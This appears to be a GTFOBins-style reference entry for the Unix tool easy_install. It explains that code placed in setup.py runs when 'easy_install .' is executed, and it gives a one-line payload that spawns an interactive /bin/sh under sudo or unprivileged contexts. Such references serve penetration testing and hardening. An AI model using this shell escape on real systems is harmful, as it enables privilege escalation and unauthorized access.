---
type: gtfobin
name: easy_install
platform: Unix
functions: [inherit]
tags: [gtfobin, unix, lotl]
---

# easy_install

## inherit

```bash
echo '...' >setup.py
easy_install .
```
_This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```_
**Contexts:** sudo, unprivileged
